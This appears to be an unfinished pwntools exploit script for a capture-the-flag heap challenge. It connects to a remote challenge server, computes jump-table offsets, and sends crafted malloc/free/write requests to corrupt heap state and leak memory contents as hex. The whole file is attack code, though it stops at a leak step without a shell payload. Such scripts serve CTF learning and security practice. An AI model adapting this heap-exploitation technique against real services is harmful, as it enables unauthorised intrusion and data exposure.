#!/usr/bin/python

from pwn import *

jump_base = 0x27f4
def hex2neg(num):
	return hex(jump_base - (0x100000000 - num))

jumptable = [0xffffed3f,0xfffff389,0xfffff389,0xfffff390,0xfffff389,0xfffff390,0xfffff389,0xfffff389,0xffffed63,0xfffff389,0xfffff389,0xfffff390,0xfffff389,0xfffff389,0xfffff389,0xfffff389,0xffffee2c,0xfffff390,0xfffff389,0xfffff389,0xfffff389,0xfffff389,0xfffff390,0xfffff389,0xffffef9b,0xfffff389,0xfffff389,0xfffff389,0xfffff389,0xfffff389,0xfffff389,0xfffff389,0xfffff191,0xfffff389,0xfffff389,0xfffff390,0xfffff389,0xfffff389,0xfffff389,0xfffff389,0xfffff29a]

MAX_MANAGER = 9 #zero base index
manager_index = 5
jump_offset = 0 # equal or smaller than 0x28 (40)

# constant set
set20 = 0
read_routine = 1
malloc_routine = 2
realloc_routine = 3
write_routine = 4
free_routine = 5

#s = remote('moonchang.ddns.net', 22222)
s = remote('plus.or.kr', 22222)
#s = remote('chal.cykor.kr', 22222)

jumpadd_table = map(hex2neg,jumptable)

print jumpadd_table	

def sendsinput(s,jumpoffset,SndString,manager_index):
	s.send(p32(jumpoffset) + SndString + p32(15) + p32(manager_index))

def setcheck(s,ind):
	sendsinput(s,set20,'AAAA',ind)

def read(s,ind,content):
	sendsinput(s,read_routine,'AAAA',ind)
	s.send(content)

def realloc(s,ind,newsize,target):
	sendsinput(s,realloc_routine,'AAAA',ind)
	s.send(p32(newsize) + p32(target))

def malloc(s,ind,size):
	sendsinput(s,malloc_routine,p32(size),ind)

def write(s,ind,target):
	sendsinput(s,write_routine,'AAAA',ind)
	s.send(p32(target))
	s.recvuntil('=>')
	log.info('buf content : ' + s.recv().encode("hex"))

def free(s,ind,target):
	sendsinput(s,free_routine,'AAAA',ind)
	s.send(p32(target))

s.recvuntil('!\n')

setcheck(s, 5)
for i in range(5):
  malloc(s, 5, 0x80)

free(s, 5, 0)
free(s, 5, 1)
free(s, 5, 3)

setcheck(s, 6)
malloc(s, 6, 0x100)

write(s, 5, 0)

s.close()

# offset 0 : read again with check bit
